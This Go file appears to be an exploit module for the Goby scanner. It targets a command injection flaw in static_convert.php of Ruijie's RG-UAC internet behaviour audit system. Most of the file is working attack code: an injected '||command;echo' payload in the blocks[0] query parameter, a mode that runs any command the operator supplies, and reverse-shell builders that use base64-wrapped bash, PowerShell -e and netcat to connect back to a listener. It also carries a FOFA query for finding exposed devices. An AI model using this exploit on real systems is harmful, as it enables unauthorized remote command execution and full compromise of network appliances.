package exploits

import (
	"encoding/base64"
	"errors"

	"net/url"

	"regexp"

	"strings"

	"time"

	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"

	"git.gobies.org/goby/goscanner/goutils"

	"git.gobies.org/goby/goscanner/jsonvul"

	"git.gobies.org/goby/goscanner/scanconfig"

	"git.gobies.org/goby/httpclient"
)

func init() {

	expJson := `{
    "Name": "Ruijie Unified Internet Behavior Management and Audit System static_convert.php Command Execution Vulnerability",
    "Description": "<p>The Ruijie Unified Internet Behavior Management and Audit System has a command execution vulnerability in the static_convert.php script. Attackers can exploit this vulnerability to execute arbitrary commands on the system, potentially leading to unauthorized access and control of the affected system.</p>",
    "Product": "Ruijie Unified Internet Behavior Management and Audit System",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2024-08-12",
    "PostTime": "2024-08-12",
    "Author": "maweixuan@baimaohui.net",
    "FofaQuery": "title=\"RG-UAC登录页面\"&&body=\"锐捷\"",
    "GobyQuery": "title=\"RG-UAC登录页面\"&&body=\"锐捷\"",
    "Level": "3",
    "Impact": "<p>This vulnerability can allow attackers to gain unauthorized access to the system, leading to data leakage, system disruption, and even complete control over the affected system. It may also be used as a pivot to attack other systems within the network.</p>",
    "Recommendation": "<p>Follow the official patch release information, patch it or upgrade to the latest version.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2024"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "锐捷统一上网行为管理与审计系统 static_convert.php 命令执行漏洞",
            "Product": "锐捷统一上网行为管理与审计系统",
            "Description": "<p>锐捷统一上网行为管理与审计系统中的static_convert.php脚本存在命令执行漏洞。攻击者可以利用此漏洞在系统上执行任意命令，可能导致未经授权访问和控制受影响的系统。<br></p>",
            "Recommendation": "<p>关注官方补丁发布信息，打上补丁或者升级到最新版本。<br></p>",
            "Impact": "<p>此漏洞可能允许攻击者未经授权访问系统，导致数据泄露、系统瘫痪，甚至完全控制受影响的系统。此外，攻击者还可能利用此漏洞作为跳板，攻击网络内的其他系统。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Ruijie Unified Internet Behavior Management and Audit System static_convert.php Command Execution Vulnerability",
            "Product": "Ruijie Unified Internet Behavior Management and Audit System",
            "Description": "<p>The Ruijie Unified Internet Behavior Management and Audit System has a command execution vulnerability in the static_convert.php script. Attackers can exploit this vulnerability to execute arbitrary commands on the system, potentially leading to unauthorized access and control of the affected system.<br></p>",
            "Recommendation": "<p>Follow the official patch release information, patch it or upgrade to the latest version.<br></p>",
            "Impact": "<p>This vulnerability can allow attackers to gain unauthorized access to the system, leading to data leakage, system disruption, and even complete control over the affected system. It may also be used as a pivot to attack other systems within the network.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9927"
}`

	setPayloadRequestHash_cLBdQl := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		extractCommandResult := func(output string) string {

			re := regexp.MustCompile(`;echo(.*?)0`)

			matches := re.FindStringSubmatch(output)

			if len(matches) > 1 {

				return strings.TrimSpace(matches[1])

			}

			return ""

		}

		path := "/view/IPV6/naborTable/static_convert.php"

		fullURL := hostInfo.FixedHostInfo + path

		encodedCommand := url.QueryEscape("||" + command + ";echo")

		fullURL += "?blocks[0]=" + encodedCommand

		getRequest := httpclient.NewGetRequestConfig(fullURL)

		getRequest.Timeout = 15

		getRequest.VerifyTls = false

		getRequest.FollowRedirect = true

		getRequest.Header.Store("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")

		resp, err := httpclient.DoHttpRequest(hostInfo, getRequest)

		if err != nil {

			return "", path, err

		}

		result := extractCommandResult(resp.Utf8Html)

		return result, path, nil

	}

	ExpManager.AddExploit(NewExploit(

		goutils.GetFileName(),

		expJson,

		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			runPayload := setPayloadRequestHash_cLBdQl

			text := goutils.RandomHexString(16)

			pocCommand := `echo ` + text

			pocResult, pocUrl, err := runPayload(hostInfo, pocCommand)

			if err != nil {

				return false

			}

			if strings.Contains(pocResult, text) {

				ss.VulURL = hostInfo.FixedHostInfo + pocUrl

				return true

			}

			return false

		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			runPayload := setPayloadRequestHash_cLBdQl

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {

				select {

				case webConsleID := <-waitSessionCh:

					if u, err := url.Parse(webConsleID); err == nil {

						expResult.Success = true

						expResult.OutputType = "html"

						sid := strings.Join(u.Query()["id"], "")

						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`

					} else {

						expResult.Success = false

						expResult.Output = "reverse shell fail"

					}

				case <-time.After(time.Second * 25):

				}

			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {

				typeList := map[string]func(string) string{

					"ByBash": godclient.ReverseTCPByBash,

					"ByBashBase64": godclient.ReverseTCPByBash,

					"ByPowershell": godclient.ReverseTCPByPowershell,

					"ByPowershellBase64": godclient.ReverseTCPByPowershell,

					"BySh": godclient.ReverseTCPBySh,

					"ByNcBsd": godclient.ReverseTCPByNcBsd,
				}

				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {

					return "", nil, errors.New("vaild exsploit")

				}

				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {

					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {

						command := typeList[reverseType](rp)

						if reverseType == "ByPowershellBase64" {

							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))

							bytes := make([]byte, len(utf16Bytes)*2)

							for i, v := range utf16Bytes {

								bytes[i*2] = byte(v)

								bytes[i*2+1] = byte(v >> 8)

							}

							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)

						}

						return command, waitSessionCh, nil

					}

				} else {

					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {

						command := typeList[reverseType](rp)

						if reverseType == "ByBashBase64" {

							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"

						}

						return command, waitSessionCh, nil

					}

				}

				return "", waitSessionCh, errors.New("gain command fail")

			}

			attackType := goutils.B2S(ss.Params["attackType"])

			switch attackType {

			case "cmd":

				command := goutils.B2S(ss.Params["cmd"])

				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {

					expResult.Success = false

					expResult.Output = err.Error()

					return expResult

				}

				if len(Result) > 0 {

					expResult.Success = true

					expResult.Output = Result

				} else {

					expResult.Success = false

					expResult.Output = "Command execution failed or returned empty result"

				}

			case "reverse":

				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {

					go runPayload(expResult.HostInfo, command)

					setReverseWaitting(expResult, waitSessionCh)

				} else {

					expResult.Success = false

					expResult.Output = err.Error()

				}

			default:

				expResult.Success = false

				expResult.Output = `Unknown exploitation method`

			}

			return expResult

		},
	))

}
